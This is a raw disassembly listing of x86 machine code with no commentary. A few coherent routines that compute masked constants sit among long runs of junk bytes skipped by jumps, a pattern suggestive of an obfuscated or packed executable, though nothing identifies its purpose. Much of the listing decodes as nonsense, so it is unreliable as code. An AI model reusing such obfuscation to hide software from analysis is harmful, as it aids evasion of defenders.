  405a0c:	add    al,0xbf
  405a0e:	cmp    DWORD PTR [ecx-0x5b3ce07f],eax
  405a14:	mov    ds:0x8b9afd47,al
  405a19:	mov    al,0x76
  405a1b:	mov    cl,0x9c
  405a1d:	hlt    
  405a1e:	inc    edi
  405a1f:	cwde   
  405a20:	jmp    0x83d7:0xaa6b86c
  405a27:	inc    ecx
  405a28:	dec    ecx
  405a29:	inc    esi
  405a2a:	ss sbb bh,dl
  405a2d:	sti    
  405a2e:	inc    ebx
  405a2f:	int3   
  405a30:	not    BYTE PTR ds:0xb0af42aa
  405a36:	mov    ch,0x83
  405a38:	cmp    esp,DWORD PTR [edx+0x4f]
  405a3b:	repnz sahf 
  405a3d:	mov    esi,0xf92823f1
  405a42:	stc    
  405a43:	in     al,0xc4
  405a45:	mov    ebx,0xbe7c1689
  405a4a:	shl    BYTE PTR [ecx],1
  405a4c:	mov    al,0x23
  405a4e:	xchg   ebp,eax
  405a4f:	mov    edi,es
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xa716624d
  405b88:	dec    ebx
  405b89:	dec    edx
  405b8a:	test   BYTE PTR [edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bbd
  405b93:	pop    esp
  405b94:	jmp    0xf558:0x9d2a60d7
  405b9b:	lahf   
  405b9c:	loopne 0x405be4
  405b9e:	dec    ebp
  405b9f:	mov    eax,0x723d27d8
  405ba4:	(bad)  
  405ba5:	lods   al,BYTE PTR ds:[esi]
  405ba6:	and    BYTE PTR [ecx],al
  405ba8:	pop    ss
  405ba9:	ret    
  405baa:	push   0x675e61b2
  405baf:	test   DWORD PTR [eax+esi*4],ebx
  405bb2:	repnz pop es
  405bb4:	pop    edi
  405bb5:	jae    0x405b73
  405bb7:	(bad)  
  405bb8:	mov    esp,0x42315ad5
  405bbd:	mov    ebx,eax
  405bbf:	mov    eax,ds:0x8809fffb
  405bc4:	std    
  405bc5:	mov    eax,0x4952d5dc
  405bca:	cmp    BYTE PTR [ebx+0x2f749f0b],ch
  405bd0:	loopne 0x405bf8
  405bd2:	or     eax,DWORD PTR [ecx-0xf3c06c]
  405bd8:	adc    edx,DWORD PTR [edx-0x1e79b875]
  405bde:	or     al,0x82
  405be0:	stos   BYTE PTR es:[edi],al
  405be1:	jmp    0x898a:0x185d8e21
  405be8:	or     al,0x94
  405bea:	add    al,0x40
  405bec:	outs   dx,BYTE PTR ds:[esi]
  405bed:	jmp    0xc77593ad
  405bf2:	lock or DWORD PTR [edi],edx
  405bf5:	adc    edx,DWORD PTR [edx-0x185a4f86]
  405bfb:	call   FWORD PTR [esi+0x35be8ac6]
  405c01:	jo     0x405b9f
  405c03:	sbb    bl,al
  405c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c06:	fiadd  WORD PTR [eax]
  405c08:	in     eax,0x45
  405c0a:	nop    edi
  405c0d:	cmp    ebx,DWORD PTR ds:0xc42c184a
  405c13:	div    BYTE PTR [eax]
  405c15:	or     BYTE PTR [eax-0x5ecf0c1],al
  405c1b:	test   BYTE PTR [ecx-0x24],0x80
  405c1f:	inc    edi
  405c20:	sbb    DWORD PTR [eax-0x6d],esi
  405c23:	les    esi,FWORD PTR [edi+0x7d]
  405c26:	dec    ebp
  405c27:	push   edi
  405c28:	pop    es
  405c29:	mov    ah,0x39
  405c2b:	push   edi
  405c2c:	pop    edi
  405c2d:	je     0x405bb3
  405c2f:	and    al,0x2c
  405c31:	jbe    0x405bbf
  405c33:	xchg   BYTE PTR [esi+edi*2],cl
  405c36:	arpl   WORD PTR [esi+0x61],sp
  405c39:	or     dh,BYTE PTR [ecx+0x21]
  405c3c:	out    0x9a,al
  405c3e:	sbb    eax,0xb4b29d29
  405c43:	push   0x7d409918
  405c48:	ret    0xbaa7
  405c4b:	stos   DWORD PTR es:[edi],eax
  405c4c:	jmp    0x9ec2:0x30ccfc2b
  405c53:	dec    ebp
  405c54:	data16 fistp WORD PTR ds:[ebx-0x13]
  405c59:	xchg   DWORD PTR [ecx+eax*4+0x44],esi
  405c5d:	fnstcw WORD PTR [edi-0x51]
  405c60:	add    al,0x2c
  405c62:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405c64:	cmp    al,0x83
  405c66:	xchg   esi,eax
  405c67:	add    BYTE PTR [esi+0x3c],ch
  405c6a:	ins    DWORD PTR es:[edi],dx
  405c6b:	or     DWORD PTR [ebx+0x15],eax
  405c6e:	fistp  QWORD PTR ds:0x3955abf8
  405c74:	lds    edi,FWORD PTR [edx]
  405c76:	xor    esp,ecx
  405c78:	dec    ecx
  405c79:	push   edi
  405c7a:	pop    edi
  405c7b:	sbb    al,BYTE PTR ds:0x2e042fce
  405c81:	into   
  405c82:	mov    edi,0xdc0244ce
  405c87:	or     ah,bl
  405c89:	jmp    0x3849:0xeb32b96f
  405c90:	out    0xdb,al
  405c92:	mov    esp,0x483c8fcc
  405c97:	imul   eax,DWORD PTR [edi-0x18],0xf9c84e74
  405c9e:	push   edx
  405c9f:	fs inc eax
  405ca1:	mov    ebp,?
  405ca3:	add    al,0x97
  405ca5:	cs sub dh,dl
  405ca8:	mov    eax,0x372cf16f
  405cad:	je     0x405cdf
  405caf:	inc    edx
  405cb0:	or     bh,BYTE PTR [edx-0x56]
  405cb3:	into   
  405cb4:	inc    edx
  405cb5:	mov    dh,0x62
  405cb7:	mov    ebp,0x4d1ba913
  405cbc:	mov    ecx,0x6f9cb0bf
  405cc1:	xor    ax,0x494b
  405cc5:	shr    BYTE PTR [ebx],1
  405cc7:	jecxz  0x405d29
  405cc9:	pop    esp
  405cca:	fdiv   st,st(5)
  405ccc:	adc    al,0xe0
  405cce:	cmp    ebx,DWORD PTR [ebp+0x29]
  405cd1:	push   0x8
  405cd3:	sub    DWORD PTR [eax*4+0x20174573],0x22
  405cdb:	or     esp,DWORD PTR [ebp-0x35]
  405cde:	jmp    0x405d44
  405ce0:	lods   al,BYTE PTR ds:[esi]
  405ce1:	enter  0x2331,0x1a
  405ce5:	xchg   edx,eax
  405ce6:	dec    esi
  405ce7:	int3   
  405ce8:	xor    DWORD PTR [edi+ecx*2-0x1d],esi
  405cec:	add    eax,0x86d58a20
  405cf1:	arpl   WORD PTR gs:[ebp-0x13830bfe],ax
  405cf8:	mov    bh,0x88
  405cfa:	pop    es
  405cfb:	cs xchg esp,eax
  405cfd:	out    0x7e,al
  405cff:	pop    esi
  405d00:	inc    edi
  405d01:	adc    cl,ah
  405d03:	push   ebp
  405d04:	inc    esi
  405d05:	call   0xb91c:0x89c67d16
  405d0c:	push   0x41
  405d0e:	pop    edi
  405d0f:	jnp    0x75158856
  405d15:	leave  
  405d16:	imul   esi,DWORD PTR [esi],0x6e778b87
  405d1c:	mov    ebp,0x549df3b0
  405d21:	xchg   edx,eax
  405d22:	inc    esp
  405d23:	add    bh,BYTE PTR [esi-0x1e7913b9]
  405d29:	loope  0x405d65
  405d2b:	xchg   esp,eax
  405d2c:	cmp    bl,BYTE PTR [edx]
  405d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d2f:	in     al,dx
  405d30:	iret   
  405d31:	xor    eax,0x7cd5dea4
  405d36:	push   edx
  405d37:	jne    0x405dad
  405d39:	lods   al,BYTE PTR ds:[esi]
  405d3a:	mov    ds:0x8e281b5d,eax
  405d3f:	stc    
  405d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d41:	adc    DWORD PTR [ecx+0x4889a162],esp
  405d47:	ins    DWORD PTR es:[edi],dx
  405d48:	push   0xffffffe1
  405d4a:	addr16 jno 0x405ce2
  405d4d:	push   0x651d877c
  405d52:	pop    ebp
  405d53:	and    ebp,DWORD PTR [ebp-0x5a3d6808]
  405d59:	jnp    0x405cef
  405d5b:	rcr    BYTE PTR [ecx+0x6e3adebf],1
  405d61:	or     eax,0x414563d7
  405d66:	fcmovb st,st(7)
  405d68:	imul   edi,eax,0x3a
  405d6b:	int    0xd8
  405d6d:	dec    eax
  405d6e:	les    edx,FWORD PTR [ecx+0x75]
  405d71:	rcr    BYTE PTR [edi],cl
  405d73:	scas   eax,DWORD PTR es:[edi]
  405d74:	int3   
  405d75:	int3   
  405d76:	mov    ebp,0x2420d0a3
  405d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d7c:	adc    esp,ecx
  405d7e:	test   DWORD PTR [eax+0x1e],0x8b7aac5b
  405d85:	aam    0xed
  405d87:	dec    edx
  405d88:	aad    0x98
  405d8a:	inc    edi
  405d8b:	aas    
  405d8c:	add    al,0xc2
  405d8e:	call   0x9112252d
  405d93:	sub    al,0xfb
  405d95:	mov    edx,?
  405d97:	aas    
  405d98:	call   0x1a:0xd245f0f5
  405d9f:	lods   al,BYTE PTR ds:[esi]
  405da0:	inc    edi
  405da1:	popf   
  405da2:	pcmpeqb mm4,QWORD PTR [ecx+0x46976cea]
  405da9:	xchg   DWORD PTR [ebp-0x443f7946],esp
  405daf:	or     edi,DWORD PTR [edi+eax*1+0x119774fa]
  405db6:	and    bh,bl
  405db8:	lahf   
  405db9:	add    al,0x8c
  405dbb:	mov    edi,0x3999b13b
  405dc0:	jecxz  0x405d54
  405dc2:	cs (bad) 
  405dc4:	and    edi,DWORD PTR [edi+0x41ea4086]
  405dca:	or     DWORD PTR [ebp+0x14a88fda],esi
  405dd0:	movq   mm7,QWORD PTR [edi+edi*2+0x31]
  405dd5:	cmp    eax,esi
  405dd7:	and    al,0xd5
  405dd9:	mov    bh,0x41
  405ddb:	pop    esi
  405ddc:	push   cs
  405ddd:	stos   DWORD PTR es:[edi],eax
  405dde:	cmc    
  405ddf:	lods   eax,DWORD PTR ds:[esi]
  405de0:	mov    WORD PTR [edi-0x2ed08dc4],?
  405de6:	pop    esi
  405de7:	std    
  405de8:	into   
  405de9:	lea    ebx,[eax]
  405deb:	xor    al,0x42
  405ded:	jg     0x405e5a
  405def:	cmp    eax,edi
  405df1:	mov    ah,0x5e
  405df3:	repz int 0xc0
  405df6:	ror    cl,0x5d
  405df9:	ficomp DWORD PTR [ecx+0x7]
  405dfc:	mov    edx,DWORD PTR [esi+esi*8+0x2fb7c06a]
  405e03:	aad    0x2e
  405e05:	in     eax,dx
  405e06:	sbb    DWORD PTR [eax+ebp*2],eax
  405e09:	dec    DWORD PTR [ecx-0x3b]
  405e0c:	lods   eax,DWORD PTR ds:[esi]
  405e0d:	in     al,dx
  405e0e:	aad    0x1c
  405e10:	dec    ecx
  405e11:	xchg   esi,eax
  405e12:	ins    DWORD PTR es:[edi],dx
  405e13:	fnstenv [ebp+0x2dd61a8e]
  405e19:	out    0x85,al
  405e1b:	add    eax,DWORD PTR [edi-0x1a]
  405e1e:	out    dx,al
  405e1f:	shr    BYTE PTR [ebp-0x35ff7652],0x14
  405e26:	lds    ecx,FWORD PTR [ecx-0x56]
  405e29:	in     al,0x6c
  405e2b:	shl    BYTE PTR [ebx-0x16c72a95],1
  405e31:	cs xchg esi,eax
  405e33:	pop    edi
  405e34:	(bad)  
  405e35:	fsub   QWORD PTR [edx+0x3a]
  405e38:	add    eax,esp
  405e3a:	sub    DWORD PTR es:[edi],eax
  405e3d:	push   0x428f9d20
  405e42:	add    DWORD PTR [esi+0x8b426c7],eax
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x42
  405ea8:	cmp    ecx,edx
  405eaa:	cs ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405eca
  405eb4:	pop    ecx
  405eb5:	fild   DWORD PTR [ebx-0x57]
  405eb8:	std    
  405eb9:	ficom  DWORD PTR [ebp-0x7c]
  405ebc:	add    al,0x44
  405ebe:	inc    ecx
  405ebf:	fst    DWORD PTR [ebp-0x51]
  405ec2:	adc    ebx,ebx
  405ec4:	xor    DWORD PTR [eax-0x20],0xffffffc2
  405ec8:	ror    cl,cl
  405eca:	pusha  
  405ecb:	jmp    0x2b2c6827
  405ed0:	jb     0x405e70
  405ed2:	int    0xfe
  405ed4:	mov    eax,DWORD PTR [edx-0x66]
  405ed7:	outs   dx,BYTE PTR ds:[esi]
  405ed8:	mov    bh,0xc5
  405eda:	xor    ebx,0xffffff8f
  405edd:	pop    es
  405ede:	(bad)  
  405edf:	mov    ds:0x5819f1ec,al
  405ee4:	xchg   ebp,eax
  405ee5:	int    0x95
  405ee7:	stos   BYTE PTR es:[edi],al
  405ee8:	xor    dl,ch
  405eea:	or     DWORD PTR es:[edi+0x76],0x99dd6587
  405ef2:	mov    bh,0x8c
  405ef4:	jecxz  0x405ebf
  405ef6:	fldcw  WORD PTR [eax+0x5ae35213]
  405efc:	jp     0x405efe
  405efe:	xchg   ebx,esi
  405f00:	fwait
  405f01:	mov    esp,0xd360ad22
  405f06:	scas   al,BYTE PTR es:[edi]
  405f07:	aam    0x68
  405f09:	add    ch,BYTE PTR [edi+0x4f]
  405f0c:	fimul  DWORD PTR [esp+eax*4]
  405f0f:	retf   0xb564
  405f12:	xor    dl,BYTE PTR [edi-0x311058f6]
  405f18:	or     ecx,ebx
  405f1a:	ret    0xbf45
  405f1d:	and    al,0x18
  405f1f:	add    eax,0x43291dff
  405f24:	dec    ebx
  405f25:	pusha  
  405f26:	dec    esi
  405f27:	mov    ebp,0x975711d2
  405f2c:	xchg   esp,ecx
  405f2e:	imul   ecx,eax,0x39
  405f31:	xchg   esi,eax
  405f32:	cmp    bl,dh
  405f34:	cmp    esi,DWORD PTR [eax+0x59]
  405f37:	pop    edx
  405f38:	imul   eax,esp,0xffffffac
  405f3b:	jmp    0x405f75
  405f3d:	aaa    
  405f3e:	push   cs
  405f3f:	pop    edi
  405f40:	sbb    DWORD PTR [edx+0x2f],edx
  405f43:	outs   dx,BYTE PTR ds:[esi]
  405f44:	fisubr WORD PTR [esi+0x59]
  405f47:	inc    edi
  405f48:	int    0x8
  405f4a:	test   ebx,ebp
  405f4c:	jle    0x405f7a
  405f4e:	mov    ds:0x2e544d69,al
  405f53:	xchg   ecx,eax
  405f54:	mov    dl,0x3a
  405f56:	lods   al,BYTE PTR ds:[esi]
  405f57:	cmp    al,0xc3
  405f59:	fidiv  DWORD PTR [esi+0x14]
  405f5c:	cld    
  405f5d:	std    
  405f5e:	or     DWORD PTR [eax],edi
  405f60:	xlat   BYTE PTR ds:[ebx]
  405f61:	shl    edi,cl
  405f63:	inc    edx
  405f64:	clc    
  405f65:	call   0x518e:0x8fed81dd
  405f6c:	jns    0x405fa7
  405f6e:	push   ds
  405f6f:	sub    ch,0x23
  405f72:	xor    BYTE PTR [ecx+edi*4+0x35],ch
  405f76:	or     cl,BYTE PTR [edi-0x28]
  405f79:	sub    edx,DWORD PTR [ebx]
  405f7b:	imul   ecx,DWORD PTR [ebp+edi*8+0x609e6825],0xe80ae5d9
  405f86:	rol    ebp,1
  405f88:	(bad)  
  405f89:	call   eax
  405f8b:	sbb    eax,0xe152e5f
  405f90:	fs xor al,0x30
  405f93:	sbb    BYTE PTR [ecx],al
  405f95:	sbb    eax,0x60201210
  405f9a:	aam    0xfb
  405f9c:	pop    ebx
  405f9d:	cs pop eax
  405f9f:	jbe    0x405fd3
  405fa1:	stos   DWORD PTR es:[edi],eax
  405fa2:	cld    
  405fa3:	inc    ebp
  405fa4:	cwde   
  405fa5:	je     0x405f42
  405fa7:	inc    eax
  405fa8:	mov    al,0xbd
  405faa:	gs jle 0x405f4e
  405fad:	dec    ebx
  405fae:	repz dec ecx
  405fb0:	or     al,0xf7
  405fb2:	jne    0x405f5a
  405fb4:	inc    DWORD PTR [edx-0x45b0cadc]
  405fba:	xor    al,0xea
  405fbc:	mov    edi,ss
  405fbe:	popa   
  405fbf:	pop    ebp
  405fc0:	scas   eax,DWORD PTR es:[edi]
  405fc1:	dec    edx
  405fc2:	lods   al,BYTE PTR ds:[esi]
  405fc3:	cld    
  405fc4:	ds xchg esi,eax
  405fc6:	popa   
  405fc7:	add    edi,DWORD PTR [edx+0x62]
  405fca:	push   ecx
  405fcb:	test   eax,0x97efe631
  405fd0:	in     al,dx
  405fd1:	xchg   ecx,eax
  405fd2:	jnp    0x405fcc
  405fd4:	jo     0x405fcd
  405fd6:	and    bl,bl
  405fd8:	stos   BYTE PTR es:[edi],al
  405fd9:	cmp    al,0x7d
  405fdb:	leave  
  405fdc:	stos   DWORD PTR es:[edi],eax
  405fdd:	xor    eax,0xc607af24
  405fe2:	mov    bh,0x7a
  405fe4:	mov    ah,0xe0
  405fe6:	lds    edx,FWORD PTR [ebp+0x3a]
  405fe9:	ret    0xf1c9
  405fec:	fcom   DWORD PTR [esi]
  405fee:	pushf  
  405fef:	ja     0x405f75
  405ff1:	(bad)  
  405ff2:	adc    eax,DWORD PTR [eax+ecx*8-0xc]
  405ff6:	ja     0x405fc9
  405ff8:	sub    ch,BYTE PTR [esi+0x4554a0ef]
  405ffe:	clc    
  405fff:	retf   0x3c83
  406002:	(bad)  
  406003:	ins    DWORD PTR es:[edi],dx
  406004:	xchg   esi,eax
  406005:	push   eax
  406006:	sub    eax,0xfb5e7f3c
  40600b:	inc    eax
  40600c:	jg     0x406078
  40600e:	xchg   edi,eax
  40600f:	jp     0x40600f
  406011:	in     al,dx
  406012:	push   ebx
  406013:	rol    al,cl
  406015:	repz or eax,0xf1eb1e78
  40601b:	inc    edi
  40601c:	jb     0x405ff5
  40601e:	pop    esi
  40601f:	and    bl,dh
  406021:	xor    eax,0x9bfa5362
  406026:	leave  
  406027:	sbb    esi,DWORD PTR [ecx]
  406029:	xor    edi,DWORD PTR [esi]
  40602b:	mov    al,ds:0x56d5527a
  406030:	test   al,0xd0
  406032:	rol    BYTE PTR [eax],1
  406034:	and    esp,DWORD PTR [esi-0x405d6bdd]
  40603a:	int    0x8b
  40603c:	retf   0xd572
  40603f:	(bad)  
  406040:	or     DWORD PTR [edi+0x26],edi
  406043:	add    al,0x9c
  406045:	clc    
  406046:	mov    dl,0x32
  406048:	sahf   
  406049:	mov    ecx,0x9325d781
  40604e:	jge    0x406007
  406050:	(bad)  
  406051:	xor    al,0x5f
  406053:	dec    ebx
  406054:	pop    edi
  406055:	and    dh,bl
  406057:	gs loope 0x405ffa
  40605a:	dec    esp
  40605b:	inc    ebp
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xa5a36096
  4060dc:	outs   dx,BYTE PTR ds:[esi]
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406140
  4060e6:	fld    st(5)
  4060e8:	out    0x3b,al
  4060ea:	(bad)  
  4060eb:	cli    
  4060ec:	(bad)  
  4060ee:	ficomp DWORD PTR [edx]
  4060f0:	imul   edx,DWORD PTR [ecx+ebp*1+0x1],0x41
  4060f5:	mov    ebx,fs
  4060f7:	gs push ebx
  4060f9:	iret   
  4060fa:	dec    edi
  4060fb:	pop    ebp
  4060fc:	and    eax,0xf620b2f3
  406101:	in     al,dx
  406102:	mov    ah,0xd2
  406104:	imul   ebx,esp,0x6e
  406107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406108:	xor    al,0x7a
  40610a:	std    
  40610b:	imul   esi,DWORD PTR [edi+0x40],0x47
  40610f:	clc    
  406110:	inc    edx
  406111:	fwait
  406112:	cwde   
  406113:	push   ds
  406114:	jl     0x4060be
  406116:	or     ebp,esi
  406118:	jle    0x406143
  40611a:	data16 and ah,BYTE PTR [eax+0x25]
  40611e:	inc    ecx
  40611f:	and    DWORD PTR [edi+ebx*8+0x34616ce1],edx
  406126:	out    dx,al
  406127:	int    0xb5
  406129:	push   ebx
  40612a:	fldcw  WORD PTR [edx]
  40612c:	pusha  
  40612d:	mov    al,0x9e
  40612f:	pop    ebx
  406130:	push   esi
  406131:	shl    ebx,1
  406133:	sti    
  406134:	sub    bl,BYTE PTR [esi+0x12c70477]
  40613a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40613b:	scas   eax,DWORD PTR es:[edi]
  40613c:	add    ebp,ecx
  40613e:	jbe    0x406150
  406140:	xchg   WORD PTR [eax-0x13931160],dx
  406147:	mov    ss,WORD PTR [esi]
  406149:	int    0xe6
  40614b:	jbe    0x4060d7
  40614d:	fcomp  DWORD PTR [eax+eiz*2-0x3c]
  406151:	fild   WORD PTR [ecx-0x10f200c3]
  406157:	daa    
  406158:	lea    esp,[ecx]
  40615a:	add    BYTE PTR [ebx],bl
  40615c:	or     bh,BYTE PTR [ebx+0x40]
  40615f:	mov    BYTE PTR [ebx],dl
  406161:	(bad)  
  406162:	cdq    
  406163:	jp     0x406195
  406165:	pop    esp
  406166:	out    0xd8,eax
  406168:	or     al,0x72
  40616a:	mov    BYTE PTR [esi+0x65],dh
  40616d:	or     DWORD PTR [esi-0x76],eax
  406170:	inc    ebx
  406171:	mov    al,ds:0x917c43f5
  406176:	dec    edx
  406177:	sti    
  406178:	outs   dx,DWORD PTR ds:[esi]
  406179:	jl     0x4061a4
  40617b:	xor    esp,0x1b
  40617e:	and    BYTE PTR [eax-0x7f9da1f3],dh
  406184:	sbb    ebp,DWORD PTR [esi+0x13]
  406187:	push   es
  406188:	mov    edx,0x5cb7f369
  40618d:	shr    BYTE PTR [ecx],cl
  40618f:	out    0xba,al
  406191:	mov    dl,0xad
  406193:	mov    ah,0xbc
  406195:	mov    dh,0x8c
  406197:	cld    
  406198:	icebp  
  406199:	sbb    esi,ebp
  40619b:	sub    DWORD PTR [eax+0x41],eax
  40619e:	sbb    cl,dl
  4061a0:	mov    DWORD PTR [edx-0x4473a66a],esp
  4061a6:	fldcw  WORD PTR [ebp+0x2f822aa5]
  4061ac:	mov    esp,0x8c1bb488
  4061b1:	or     al,0x97
  4061b3:	xchg   ebp,eax
  4061b4:	xchg   ecx,eax
  4061b5:	adc    ch,BYTE PTR [ebx+0x7e]
  4061b8:	sbb    ebx,0x17
  4061bb:	add    bl,BYTE PTR [ebp+0x57]
  4061be:	xor    al,0x14
  4061c0:	mov    ecx,DWORD PTR [ebx-0x56]
  4061c3:	mov    esp,0xda07515b
  4061c8:	jb     0x4061eb
  4061ca:	adc    dl,BYTE PTR [edi]
  4061cc:	push   0x73
  4061ce:	into   
  4061cf:	mov    bh,0xbf
  4061d1:	adc    al,0xd4
  4061d3:	mov    ch,0xe
  4061d5:	mov    dl,0xd1
  4061d7:	repz xchg esi,eax
  4061d9:	push   edi
  4061da:	cld    
  4061db:	xchg   esp,eax
  4061dc:	adc    DWORD PTR ds:0x5f9e6f2d,0xffffffd5
  4061e3:	jnp    0x4061fd
  4061e5:	add    dh,BYTE PTR [ebx-0x2c]
  4061e8:	mov    DWORD PTR [ecx],eax
  4061ea:	pop    ecx
  4061eb:	inc    eax
  4061ec:	fisub  DWORD PTR [eax]
  4061ee:	shr    DWORD PTR [edx-0x14629965],0xe1
  4061f5:	retf   
  4061f6:	hlt    
  4061f7:	xchg   esi,eax
  4061f8:	dec    edx
  4061f9:	lods   eax,DWORD PTR cs:[esi]
  4061fb:	xchg   ebp,eax
  4061fc:	mov    esp,0x28ef4c01
  406201:	gs or  eax,0xb0cb7d2b
  406207:	push   0x1fccc419
  40620c:	mov    eax,gs:0x8577e927
  406212:	pop    eax
  406213:	enter  0x196f,0x6
  406217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406218:	lds    ebp,FWORD PTR ds:0xb61cd971
  40621e:	inc    ebx
  40621f:	cmp    al,0xab
  406221:	sbb    eax,0x2dadf0d1
  406226:	and    eax,0x73efb872
  40622b:	mov    DWORD PTR ss:[ecx+0x7a],eax
  40622f:	call   0x874a232e
  406234:	and    esi,DWORD PTR [ebx]
  406236:	pop    esi
  406237:	jbe    0x4061ce
  406239:	cmp    BYTE PTR [ecx+ecx*4+0x2b],bh
  40623d:	ss loop 0x40622b
